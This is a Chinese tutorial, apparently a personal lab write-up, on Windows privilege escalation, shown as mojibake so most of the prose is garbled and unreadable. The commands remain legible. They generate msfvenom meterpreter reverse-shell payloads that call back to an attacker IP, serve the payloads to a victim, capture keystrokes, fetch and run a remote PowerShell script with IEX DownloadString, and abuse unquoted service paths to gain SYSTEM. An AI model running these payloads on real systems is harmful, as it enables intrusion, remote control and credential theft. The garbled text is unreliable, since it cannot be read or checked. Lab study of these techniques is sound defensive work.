Userï¼šæ™®é€šç”¨æˆ·æƒé™ï¼Œç³»ç»Ÿä¸­æœ€å®‰å…¨çš„æƒé™ï¼Œåˆ†é…ç»™è¯¥ç»„çš„é»˜è®¤æƒé™ä¸å…è®¸æˆå‘˜ä¿®æ”¹æ“ä½œç³»ç»Ÿçš„è®¾ç½®æˆ–ç”¨æˆ·èµ„æ–™ Administratorï¼šç®¡ç†å‘˜æƒé™ï¼Œå¯ä»¥åˆ©ç”¨ Windows çš„æœºåˆ¶å°†è‡ªå·±æå‡ä¸º System æƒé™ï¼Œä»¥ä¾¿æ“ä½œ SAM æ–‡ä»¶ç­‰ Systemï¼šç³»ç»Ÿæƒé™ï¼Œå¯ä»¥å¯¹ SAM ç­‰æ•æ„Ÿæ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œå¾€å¾€éœ€è¦ Administrator æƒé™æå‡åˆ° System æƒé™æ‰å¯ä»¥å¯¹æ•£åˆ—å€¼è¿›è¡Œ Dump æ“ä½œ TrustedInstallerï¼šæœ€é«˜æƒé™ï¼Œ å¯¹äºç³»ç»Ÿæ–‡ä»¶ï¼Œå³ä½¿ System æƒé™ä¹Ÿæ— æ³•è¿›è¡Œä¿®æ”¹ï¼Œåªæœ‰ TrustedInstaller æƒé™æ‰å¯ä»¥ä¿®æ”¹æ–‡ä»¶ 1.3 å¸¸è§ webshell æ‰€å¤„çš„æƒé™ é€šå¸¸çš„ webshell æƒé™å¦‚ä¸‹ï¼š ASPã€PHP - åŒ¿åæƒé™ ASPX - user æƒé™ JSP - é€šå¸¸æ˜¯ç³»ç»Ÿæƒé™ 1.4 æƒé™æå‡åˆ†ç±» çºµå‘ææƒï¼šä½æƒé™ç”¨æˆ·è·å¾—é«˜æƒé™è§’è‰²çš„æƒé™ã€‚ æ¨ªå‘ææƒï¼šè·å¾—åŒçº§åˆ«è§’è‰²çš„æƒé™ã€‚ å¸¸ç”¨çš„ææƒæ–¹æ³•æœ‰Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ææƒã€æ•°æ®åº“ææƒç­‰ç­‰ã€‚ä¸‹é¢æˆ‘ä»¬å¯¹å¸¸ç”¨çš„å‡ ç§ææƒçš„æ–¹æ³•è¿›è¡Œé€ä¸€æ¼”ç¤ºã€‚ 0x02 ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒ â€‹ æº¢å‡ºæ¼æ´æ˜¯ä¸€ç§è®¡ç®—æœºç¨‹åºçš„å¯æ›´æ­£æ€§ç¼ºé™·ã€‚æº¢å‡ºæ¼æ´çš„å…¨åï¼šç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚å› ä¸ºå®ƒæ˜¯åœ¨ç¨‹åºæ‰§è¡Œçš„æ—¶å€™åœ¨ç¼“å†²åŒºæ‰§è¡Œçš„é”™è¯¯ä»£ç ï¼Œæ‰€ä»¥å«ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚ç¼“å†²æº¢å‡ºæ˜¯æœ€å¸¸è§çš„å†…å­˜é”™è¯¯ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ”»å‡»è€…å…¥ä¾µç³»ç»Ÿæ—¶æ‰€ç”¨åˆ°çš„æœ€å¼ºå¤§ã€æœ€ç»å…¸çš„ä¸€ç±»æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚æˆåŠŸåœ°åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´å¯ä»¥ä¿®æ”¹å†…å­˜ä¸­å˜é‡çš„å€¼ï¼Œç”šè‡³å¯ä»¥åŠ«æŒè¿›ç¨‹ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œæœ€ç»ˆè·å¾—ä¸»æœºçš„æ§åˆ¶æƒã€‚ â€‹ åˆ©ç”¨Windowsç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒæ˜¯ä¸€ç§å¾ˆé€šç”¨çš„ææƒæ–¹æ³•ï¼Œæ”»å‡»è€…é€šå¸¸å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•ç»•è¿‡ç³»ç»Ÿä¸­çš„æ‰€æœ‰å®‰å…¨é™åˆ¶ã€‚æ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´çš„å…³é”®æ˜¯ç›®æ ‡ç³»ç»Ÿæœ‰æ²¡æœ‰åŠæ—¶å®‰è£…è¡¥ä¸ï¼Œå¦‚æœç›®æ ‡ç³»ç»Ÿæ²¡æœ‰å®‰è£…æŸä¸€æ¼æ´çš„è¡¥ä¸ä¸”å­˜åœ¨è¯¥æ¼æ´çš„è¯ï¼Œæ”»å‡»è€…å°±ä¼šå‘ç›®æ ‡ç³»ç»Ÿä¸Šä¼ æœ¬åœ°æº¢å‡ºç¨‹åºï¼Œæº¢å‡ºAdministratoræƒé™ã€‚ ä¸‹é¢æ¼”ç¤ºææƒè¿‡ç¨‹ã€‚ 2.1 æ‰‹åŠ¨æŸ¥æ‰¾ç³»ç»Ÿæ½œåœ¨æ¼æ´ è·å–ç›®æ ‡ä¸»æœºçš„ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„shellåï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿä¸Šå®‰è£…äº†é‚£äº›è¡¥ä¸ï¼š systeminfo æˆ– wmic qfe get caption,description,hotfixid,installedon å¯ä»¥çœ‹åˆ°ç³»ç»Ÿå°±è£…äº†è¿™å‡ ä¸ªè¡¥ä¸ã€‚æ”»å‡»è€…ä¼šé€šè¿‡æ²¡æœ‰åˆ—å‡ºçš„è¡¥ä¸å·ï¼Œå¯»æ‰¾ç›¸åº”çš„ææƒEXPï¼Œä¾‹å¦‚KiTrap0Då’ŒKB979682å¯¹åº”ã€MS10-021å’ŒKB979683å¯¹åº”ç­‰ç­‰ã€‚ç„¶åä½¿ç”¨ç›®æ ‡æœºä¸Šæ²¡æœ‰çš„å®‰è£…çš„è¡¥ä¸å·å¯¹åº”çš„EXPè¿›è¡Œææƒã€‚Windowsä¸åŒç³»ç»Ÿææƒçš„æ¼æ´å’Œç›¸åº”çš„è¡¥ä¸è¯·è§ï¼šç‚¹æˆ‘å‘€ã€‚ 2.2 è‡ªåŠ¨æŸ¥æ‰¾ç³»ç»Ÿæ½œåœ¨æ¼æ´ æ–¹æ³•ä¸€ï¼šWindows Exploit Suggester ä¸‹è½½åœ°å€ï¼šhttps://github.com/GDSSecurity/Windows-Exploit-Suggester è¯¥å·¥å…·å¯ä»¥å°†ç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„è¡¥ä¸ç¨‹åºä¸å¾®è½¯çš„æ¼æ´æ•°æ®åº“è¿›è¡Œæ¯”è¾ƒï¼Œå¹¶å¯ä»¥è¯†åˆ«å¯èƒ½å¯¼è‡´æƒé™æå‡çš„æ¼æ´ï¼Œè€Œä¸”å…¶åªéœ€è¦æˆ‘ä»¬ç»™å‡ºç›®æ ‡ç³»ç»Ÿçš„ä¿¡æ¯å³å¯ã€‚ ä½¿ç”¨å¦‚ä¸‹ï¼š é¦–å…ˆæ›´æ–°æ¼æ´æ•°æ®åº“ï¼Œä¼šç”Ÿæˆä¸€ä¸ªxlsçš„æ–‡ä»¶ï¼Œå¦‚ä¸‹ 2023-09-20-mssb.xls è¿™é‡Œæœ‰ä¸ªå°é—®é¢˜ï¼Œé¦–å…ˆä¸‹è½½å¥½zipæ›´æ–°äº†æ•°æ®åº“ä¹‹åï¼Œéœ€è¦å®‰è£…ä¸€ä¸ªä¾èµ–ï¼Œä¾èµ–é¡¹ç›®ä¸­æœ‰è¯´æ˜ï¼Œä¹‹åæ›´æ–°æ•°æ®åº“æŒ‰ç†æ¥è¯´ï¼Œæ›´æ–°çš„æ–‡ä»¶åç¼€åº”ä¸ºxlsï¼Œå¯æˆ‘è¿™é‡Œæ˜¯xlsxï¼Œå¦‚æœç›´æ¥ç”¨xlsxåˆ™ä¼šæŠ¥é”™ï¼ˆä»¥ä¸Šæ˜¯æˆ‘åœ¨è™šæ‹Ÿæœºçš„æƒ…å†µï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æœ¬åœ°æ›´æ–°åæ‰“å¼€å¦å­˜ä¸ºxlsï¼Œå…·ä½“å‘¢æ¨èå¦‚ä¸‹å›¾æ‰€ç¤ºçš„æ ¼å¼ å…¶ä»–å½¢å¼è¿˜æœªå°è¯•ï¼Œå¤§å®¶æ„Ÿå…´è¶£å¯ä»¥æµ‹è¯• æ³¨æ„å¿…é¡»ä¸ºpython2ç¯å¢ƒ ç„¶åæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹ç›®æ ‡ä¸»æœºç³»ç»Ÿä¿¡æ¯ï¼Œä¿å­˜ä¸ºsysinfo.txtæ–‡ä»¶ï¼š systeminfo &gt; sysinfo.txt æœ€åï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæŸ¥çœ‹è¯¥ç³»ç»Ÿæ˜¯å¦å­˜åœ¨å¯åˆ©ç”¨çš„ææƒæ¼æ´ï¼š python2 windows-exploit-suggester.py -d 2020-08-20-mssb.xls -i sysinfo.txt å¦‚ä¸Šå›¾ï¼Œæ‰§è¡Œåï¼Œç»™å‡ºäº†ä¸€äº›ç›®æ ‡ç³»ç»Ÿå­˜åœ¨çš„æ¼æ´ æ–¹æ³•äºŒï¼šlocal_exploit_suggester æ¨¡å— Metasploitå†…ç½®æ¨¡å—æä¾›äº†å„ç§å¯ç”¨äºææƒçš„local exploitsï¼Œå¹¶ä¼šåŸºäºæ¶æ„ï¼Œå¹³å°ï¼ˆå³è¿è¡Œçš„æ“ä½œç³»ç»Ÿï¼‰ï¼Œä¼šè¯ç±»å‹å’Œæ‰€éœ€é»˜è®¤é€‰é¡¹æä¾›å»ºè®®ã€‚è¿™æå¤§çš„èŠ‚çœäº†æˆ‘ä»¬çš„æ—¶é—´ï¼Œçœå»äº†æˆ‘ä»¬æ‰‹åŠ¨æœç´¢local exploitsçš„éº»çƒ¦ã€‚ ä½¿ç”¨å¦‚ä¸‹ï¼Œå‡è®¾æˆ‘ä»¬å·²ç»è·å¾—äº†ç›®æ ‡ä¸»æœºçš„ä¸€ä¸ªsessionï¼š use post/multi/recon/local_exploit_suggester set session 1 exploit è¿™é‡Œæˆ‘å°±æœäº†ç¯‡æ–‡ç« ï¼Œå¯¹win7é¶æœºè·å–ä¸€ä¸‹å…¶session å°tipï¼šåæ¸—é€ä¹‹è·å–æ™®é€šsession æ‰€éœ€ç¯å¢ƒï¼š1.kali Linuxï¼ˆæ”»å‡»æœºï¼‰ 2.windows7ï¼ˆé¶æœºï¼‰ åœ¨kaliç»ˆç«¯ä¸­æ‰“å¼€msfconsoleæ§åˆ¶å° å¼€å¯ç›‘å¬ use exploit/multi/handler è®¾ç½®tcpç›‘å¬ set payload windows/meterpreter/reverse_tcp Linuxï¼š msfvenom -p linux/x64/meterpreter/reverse_tcp lhost= lport= -f elf &gt; shell.elf Windows: 32 ä½ï¼šmsfvenom -p windows/meterpreter/reverse_tcp lhost= lport= -f exe &gt; shell.exe 64 ä½ï¼šmsfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.17.128 lport=4444 -a x64 -f exe &gt; shell.exe è¯´æ˜ï¼š-p payload(æœ‰æ•ˆè½½è·) é€šä¿—çš„è®²payloadæ˜¯ç”¨æ¥å»ºç«‹ç›®æ ‡æœºä¸æ”»å‡»æœºç¨³å®šè¿æ¥çš„ï¼Œå¯ä»¥è¿”å›shell -e ç¼–ç æ–¹å¼ -i ç¼–ç æ¬¡æ•° -b åœ¨ç”Ÿæˆçš„ç¨‹åºä¸­é¿å…å‡ºç°çš„å€¼ -f exe ç”Ÿæˆexeæ ¼å¼ msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.17.137 lport=4444 -f exe &gt; shell.exe ä¸è¿‡æ“ä½œä¸‹æ¥ï¼Œå‘ç°æ²¡å¿…è¦éå¾—å†™64ä½å¯¹åº”çš„å‘½ä»¤ï¼Œåè€Œè¿™ä¸ªå‘½ä»¤è¿˜æŠ¥é”™ï¼Œä¸çŸ¥æ˜¯å¦ä¸ºæˆ‘çš„å¤±è¯¯ 4.å°†è¯¥shellæ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºä¸­ã€‚åœ¨kaliæ§åˆ¶å°ä¸‹ä½¿ç”¨python ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼špython -m SimpleHTTPServer 800æ­å»ºä¸€ä¸ªhttpæœåŠ¡ï¼Œæä¾›ä¸€ä¸ªwebé¡µé¢ä¾›é¶æœºæµè§ˆã€‚(ä¸€å®šæ˜¯åœ¨ç®¡ç†å‘˜æ¨¡å¼ä¸‹æ‰§è¡Œæ­¤å‘½ä»¤ (sudo su)) ä¸è¿‡è¿™é‡Œä¸ç”¨æ800,é»˜è®¤ç«¯å£å³å¯ å€¼å¾—æ³¨æ„çš„æ˜¯python2æ‰å¯ä»¥ æ‰“å¼€ç›®æ ‡æœºwin7ï¼Œè¾“å…¥åœ°å€è¿›è¡Œä¸‹è½½æœ¨é©¬å¹¶ä¿å­˜åœ¨æ¡Œé¢ ä¸Šå›¾ä¸ºä¸‹è½½çš„å›æ˜¾ï¼Œè¿”å›ç¬¬äºŒæ­¥ç•Œé¢ï¼Œè®¾ç½®ç›‘å¬ä¸»æœºï¼Œè¿è¡Œ å¯ä»¥çœ‹åˆ°å¾—åˆ°äº†session â€‹ æŸ¥çœ‹sessionï¼Œå¦‚æœæ­¤æ—¶æ˜¯meterpreterï¼Œè¾“å…¥backgroundå³å¯è¿”å›msf exploit(multi/handler) æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯:sysinfo æˆªå–æ—¶ä¸‹æ¡Œé¢:screenshot æ•è·å‡»é”®è®°å½•:keyscan start æ§åˆ¶é”®ç›˜é¼ æ ‡ å¯ç”¨/ç¦ç”¨:uictl enable/disable keyboard å‚è€ƒæ–‡ç« ï¼šmsf è·å–ä¸€ä¸ªæ™®é€šçš„session æ§åˆ¶windows æ¥ä¸Šå›ï¼Œæˆ‘ä»¬å·²ç»è·å¾—äº†ç›®æ ‡ä¸»æœºçš„ä¸€ä¸ªsessionï¼š use post/multi/recon/local_exploit_suggester set session 1 exploit è¿™é‡Œä¹Ÿæœ‰ä¸ªå°å‘ï¼Œå¿…é¡»è¦åœ¨åŒä¸€ç»ˆç«¯ä¸‹ï¼Œå°†msfå…ˆæŒ‚ä¸ªåå°ï¼Œé€šè¿‡backgroundï¼Œéšååœ¨æ‰§è¡Œä¸Šè¿°å‘½ä»¤ è¿™é‡Œä¹Ÿæ˜¯å‘ç°äº†äºŒåå‡ ä¸ªï¼Œè¯¥æ¨¡å—å¿«é€Ÿè¯†åˆ«å¹¶åˆ—å‡ºäº†ç³»ç»Ÿä¸­å¯èƒ½è¢«åˆ©ç”¨çš„æ¼æ´ï¼Œååˆ†æ–¹ä¾¿ã€‚ä½†è™½ç„¶å¦‚æ­¤ï¼Œä¹Ÿå¹¶éæ‰€æœ‰åˆ—å‡ºçš„local exploitséƒ½å¯ç”¨ã€‚ æ–¹æ³•ä¸‰ï¼šenum_patches æ¨¡å— ä¼šç”¨metasploitä¸­çš„post/windows/gather/enum_patchesæ¨¡å—å¯ä»¥æ ¹æ®æ¼æ´ç¼–å·å¿«é€Ÿæ‰¾å‡ºç³»ç»Ÿä¸­ç¼ºå°‘çš„è¡¥ä¸ã€‚ä½¿ç”¨å¦‚ä¸‹ï¼š use post/windows/gather/enum_patches set session 1 exploit è¿™é‡Œä¸åœ¨æ¼”ç¤ºäº†ï¼ŒåŒä¸Šè¿°æ­¥éª¤å³å¯ åœ¨å®é™…çš„æŸ¥æ‰¾æ½œåœ¨æ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œå»ºè®®æ‰‹åŠ¨å’Œè‡ªåŠ¨åŒç®¡é½ä¸‹ã€‚ ä¸‹è½½åœ°å€ï¼šhttps://github.com/rasta-mouse/Sherlock è¯¥è„šæœ¬å¯ä»¥å¿«é€Ÿçš„æŸ¥æ‰¾å‡ºå¯èƒ½ç”¨äºæœ¬åœ°æƒé™æå‡çš„æ¼æ´ã€‚ä½¿ç”¨å¦‚ä¸‹ï¼š powershell -exec bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ip/Sherlock.ps1'); // è¿œç¨‹æ‰§è¡Œ #å¯¼å…¥æ¨¡å— Import-Module .\\Sherlock.ps1 #å¦‚æœæç¤ºæœªèƒ½åŠ è½½æŒ‡å®šæ¨¡å—ï¼Œåˆ™å¯èƒ½æ˜¯æƒé™é—®é¢˜ï¼Œä»¥ç®¡ç†å‘˜æƒé™è¿è¡Œpowershellï¼Œç„¶åè¾“å…¥å¦‚ä¸‹ä»£ç  Set-ExecutionPolicy Unrestricted #è¾“å…¥å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹å¸®åŠ©ä¿¡æ¯ powercat -h Find-AllVulns // è°ƒç”¨è„šæœ¬åï¼Œæ‰§è¡Œæœç´¢å‘½ä»¤ è¿™é‡Œæ€»æ˜¯æŠ¥é”™ï¼Œæˆ‘å°±ä¸‹è½½åˆ°æœ¬åœ°äº†ï¼Œè¿™é‡Œæœç´¢çš„æ—¶é—´è¾ƒé•¿ï¼Œè€å¿ƒç­‰å¾… 2.3 é€‰æ‹©æ¼æ´å¹¶åˆ©ç”¨ æŸ¥æ‰¾äº†ç›®æ ‡æœºå™¨ä¸Šçš„è¡¥ä¸å¹¶ç¡®å®šå­˜åœ¨æ¼æ´åï¼Œæˆ‘ä»¬å°±å¯ä»¥åƒç›®æ ‡æœºå™¨ä¸Šä¼ æœ¬åœ°æº¢å‡ºç¨‹åºï¼Œå¹¶æ‰§è¡Œã€‚è¿™é‡Œï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯CVE-2018-8120ã€‚ æ¼æ´åˆ©ç”¨ç¨‹åºå¯ä»¥ä»ä»¥ä¸‹å‡ ä¸ªåœ°å€ä¸­ä¸‹è½½ï¼šï¼ˆé‡Œé¢é™„æœ‰ä½¿ç”¨è¯´æ˜ï¼‰ Windows ä¸‹çš„ææƒå¤§åˆé›†ï¼šhttps://github.com/lyshark/Windows-exploits Windowså†…æ ¸æº¢å‡ºæ¼æ´ææƒå¤§å…¨ï¼šhttps://github.com/SecWiki/windows-kernel-exploits å„å¤§å¹³å°ææƒå·¥å…·ï¼šhttps://github.com/klsfct/getshell è¿™é‡Œä¸‹è½½çš„æ—¶å€™æ³¨æ„å°†exeæ–‡ä»¶æ”¾å…¥ç›¸åº”ç›®å½•åœ¨æ‰§è¡Œå¦‚ä¸Šå‘½ä»¤ å¦‚ä¸Šå›¾ï¼Œå†æ‰§è¡Œææƒç¨‹åºä¹‹å‰ï¼Œä¸ºæ™®é€šç”¨æˆ·whoamiæƒé™ï¼Œæ‰§è¡Œåä¸ºsystemæƒé™ã€‚msfconsoleä¸Šå®Œæ•´æ“ä½œå¦‚ä¸‹ï¼š è¿™é‡Œå°è¯•äº†å¤šä¸ªæ¼æ´ï¼Œä½†ä¼¼ä¹æ˜¯æˆ‘çš„ç”¨æ³•ä¸æ­£ç¡®ï¼ˆè€Œä¸”æˆ‘ä¹Ÿä¸çŸ¥é“å¦‚ä½•ç”¨ï¼‰å¯¼è‡´åœ¨æ­¤ç¯å¢ƒä¸‹whoamiä¸€ç›´ä¸ºæ™®é€šç”¨æˆ· ä½†å¥‡æ€ªçš„æ˜¯æ¯æ¬¡æ‰§è¡Œå‘½ä»¤ä¹‹åï¼Œé¶æœºéƒ½ä¼šè‡ªåŠ¨è·³è½¬ä¸€ä¸ªä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€çš„cmd ä½†å¯èƒ½ä¸ºå¦ä¸€ç§æƒ…å†µï¼Œå°±æ˜¯å…¶ç›®æ ‡å°±æ˜¯è®©é¶æœºææƒï¼Œä½†æˆ–è®¸ååº”ä¸åˆ°msfä¸Šï¼Œè¿™é‡Œæˆ‘å¯¹å†…ç½‘æ¸—é€äº†è§£è¾ƒå°‘ï¼Œå¯èƒ½ç†è§£æœ‰é—®é¢˜å§ï¼Œå…ˆè¿‡ä¸ªæ€è·¯ã€‚ ä¸è¿‡åœ¨çªç„¶çœ‹åˆ°é¶æœºä¸­æœ‰äº†ç›¸åº”çš„expï¼Œæˆ‘ä¾¿çŸ¥é“äº†ï¼Œuploadå°±ä¼šå°†è¯¥ expç”±æ”»å‡»è€…ä¸‹è½½åˆ°é¶æœºå¤„ï¼Œæ¥ç€æ‰§è¡Œè¯¥ exe æ–‡ä»¶ï¼Œæ‰§è¡Œåä¾¿ä¹Ÿå°±æ˜¯ææƒäº†ï¼Œå³ä¹Ÿæ˜¯ä¸ºä½•æœ€åå‡ºç°system cmdçš„åŸå› å§ï¼Œä½†ä»ä¸ç†è§£çš„æ˜¯ä¸ºä½•msfçš„whoamiæ²¡æœ‰æ˜¾ç¤ºç®¡ç†å‘˜æƒé™ 0x03 ç³»ç»Ÿé”™è¯¯é…ç½®æ¼æ´ææƒ åœ¨Windowsç³»ç»Ÿä¸­ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šé€šè¿‡ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´æ¥ææƒï¼Œä½†æ˜¯å¦‚æœç¢°åˆ°æ— æ³•é€šè¿‡ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´ææƒçš„æƒ…å†µæ—¶ï¼Œä¼šå¯ä»¥åˆ©ç”¨ç³»ç»Ÿä¸­çš„é”™è¯¯é…ç½®æ¼æ´æ¥ææƒã€‚ä¸‹é¢æ¼”ç¤ºå‡ ç§å¸¸è§çš„Windowsç³»ç»Ÿé”™è¯¯é…ç½®æ¼æ´ææƒæ–¹æ³•ã€‚ Trusted Service Pathsæ¼æ´ï¼ˆå¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´ï¼‰ Trusted Service Paths æ¼æ´æ˜¯ç”±ç³»ç»Ÿä¸­çš„â€œCreateProcessâ€å‡½æ•°å¼•èµ·çš„ï¼Œå¹¶åˆ©ç”¨äº†windowsæ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬æ¥è®¤è¯†ä¸€ä¸‹Windowsä¸­æ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡ä»¶è·¯å¾„ä¸ºâ€œC:\\Program Files\\Some Folder\\Service.exeâ€ã€‚é‚£ä¹ˆï¼Œå¯¹äºè¯¥è·¯å¾„ä¸­çš„æ¯ä¸€ä¸ªç©ºæ ¼ï¼ŒWindowséƒ½ä¼šå°è¯•å¯»æ‰¾å¹¶æ‰§è¡Œä¸ç©ºæ ¼å‰é¢çš„åå­—ç›¸åŒ¹é…çš„ç¨‹åºã€‚å¦‚ä¸Šé¢çš„ç›®å½•ä¸ºä¾‹ï¼ŒWindowsä¼šä¾æ¬¡å°è¯•ç¡®å®šå’Œæ‰§è¡Œä¸€ä¸‹ç¨‹åºï¼š 1. C:\\Program.exe 2. C:\\Program Files\\Some.exe 3. C:\\Program Files\\Some Folder\\Service.exe å¯è§ï¼Œæœ€åæ‰ç¡®å®šå¹¶æ‰§è¡ŒçœŸæ­£çš„ç¨‹åºService.exeã€‚è€Œç”±äºWindowsæœåŠ¡é€šå¸¸æ˜¯ä»¥systemæƒé™è¿è¡Œçš„ï¼Œæ‰€ä»¥ç³»ç»Ÿåœ¨è§£ææœåŠ¡æ‰€å¯¹åº”çš„æ–‡ä»¶è·¯å¾„ä¸­çš„ç©ºæ ¼æ—¶ï¼Œä¹Ÿä¼šä»¥systemç³»ç»Ÿæƒé™è¿›è¡Œï¼Œé‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬å°†ä¸€ä¸ªâ€œé€‚å½“å‘½åâ€çš„å¯æ‰§è¡Œç¨‹åºä¸Šä¼ åˆ°ä»¥ä¸Šæ‰€è¯´çš„å—å½±å“çš„ç›®å½•ä¸­ï¼ŒæœåŠ¡ä¸€æ—¦å¯åŠ¨æˆ–é‡å¯ï¼Œè¯¥ç¨‹åºå°±ä¼šä»¥systemæƒé™è¿è¡Œäº†ï¼Œå¯è§è¯¥æ¼æ´åˆ©ç”¨äº†æœåŠ¡è·¯å¾„çš„æ–‡ä»¶/æ–‡ä»¶å¤¹çš„æƒé™ã€‚ è¯¥æ¼æ´æ˜¯ç”±äºä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶æ²¡æœ‰æ­£ç¡®çš„å¤„ç†æ‰€å¼•ç”¨çš„å®Œæ•´è·¯å¾„åï¼Œå³ä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å®Œæ•´è·¯å¾„ä¸­å«æœ‰ç©ºæ ¼ä¸”æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ï¼Œé‚£ä¹ˆè¯¥æœåŠ¡å°±å­˜åœ¨è¿™ä¸ªæ¼æ´ã€‚ä¸‹é¢æ¼”ç¤ºè¯¥æ¼æ´åˆ©ç”¨æ–¹æ³•ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤åˆ—å‡ºç›®æ ‡ä¸»æœºä¸­æ‰€æœ‰å­˜åœ¨ç©ºæ ¼ä¸”æ²¡æœ‰è¢«å¼•å·æ‹¬èµ·æ¥æœåŠ¡è·¯å¾„ï¼š wmic service get name,displayname,pathname,startmode|findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr/i /v \"\"\" æˆ‘çš„é¶æœºéƒ½æ²¡æœ‰æ­¤æ¼æ´ï¼Œä¹Ÿæœ‰ç‚¹æ‡’ä¸æƒ³è´¹æ—¶é—´æ­äº†ï¼Œå› æ­¤è·Ÿç€è¿‡ä¸€éæ€è·¯å§ å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°â€œwhoamiâ€å’Œâ€œBunnyâ€è¿™ä¸¤ä¸ªæœåŠ¡å¯¹åº”çš„äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„æ²¡æœ‰å¼•å·åŒ…å«èµ·æ¥ï¼Œå¹¶ä¸”è·¯å¾„ä¸­åŒ…å«ç©ºæ ¼ã€‚æ˜¯å­˜åœ¨è¯¥æ¼æ´çš„ï¼Œä½†åœ¨ä¸Šä¼ å¯æ‰§è¡Œæ–‡ä»¶è¿›å»ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šæˆ‘ä»¬å¯¹ç›®æ ‡æ–‡ä»¶å¤¹æ˜¯å¦æœ‰å†™å…¥çš„æƒé™ã€‚ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨Windowsä¸­çš„icaclså‘½ä»¤ï¼Œä¾æ¬¡æ¥æ£€æŸ¥â€œC:\\â€ã€â€œC:\\Program Files\\Program Folderâ€ç­‰ç›®å½•çš„æƒé™å‘ç°åªæœ‰â€œC:\\Program Files\\program folderâ€ç›®å½•æœ‰Everyone(OI)(CI)(F)ï¼š å‚æ•°è¯´æ˜ï¼š â€œMâ€è¡¨ç¤ºä¿®æ”¹ â€œFâ€ä»£è¡¨å®Œå…¨æ§åˆ¶ â€œCIâ€ä»£è¡¨ä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ â€œOIâ€ä»£è¡¨ä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ã€‚ è¿™å°±æ„å‘³ç€å¯¹è¯¥ç›®å½•æœ‰è¯»ï¼Œå†™ï¼Œåˆ é™¤å…¶ä¸‹çš„æ–‡ä»¶ï¼Œåˆ é™¤è¯¥ç›®å½•ä¸‹çš„å­ç›®å½•çš„æƒé™ã€‚ ç¡®è®¤ç›®æ ‡æœºå™¨ä¸­å­˜åœ¨æ­¤æ¼æ´åï¼ŒæŠŠè¦ä¸Šä¼ çš„ç¨‹åºé‡å‘½åå¹¶æ”¾ç½®åœ¨å­˜åœ¨æ­¤æ¼æ´ä¸”å¯å†™çš„ç›®å½•ä¸‹ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå°è¯•é‡å¯æœåŠ¡ã€‚ sc stop &lt;service_name&gt; sc start &lt;service_name&gt; æ—¢ç„¶è¦é‡å¯æœåŠ¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ï¼Œè¯¥ææƒæ–¹æ³•éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œé‡å¯æœåŠ¡çš„æ–¹æ³•é€‚ç”¨äºä»ç®¡ç†å‘˜æƒé™åˆ°systemçš„æƒé™æå‡è¿‡ç¨‹ã€‚è€Œå®é™…æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ç›´æ¥å¯¹ç›®æ ‡ä¸»æœºæ‰§è¡Œâ€œshutdown -r -t 0â€å‘½ä»¤è®©ä»–é‡å¯å°±è¡Œäº†ã€‚ æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªmsfé©¬å¹¶é‡å‘½åä¸ºHello.exeä¸Šä¼ åˆ°è¯¥â€œC:\\Program Files\\Program 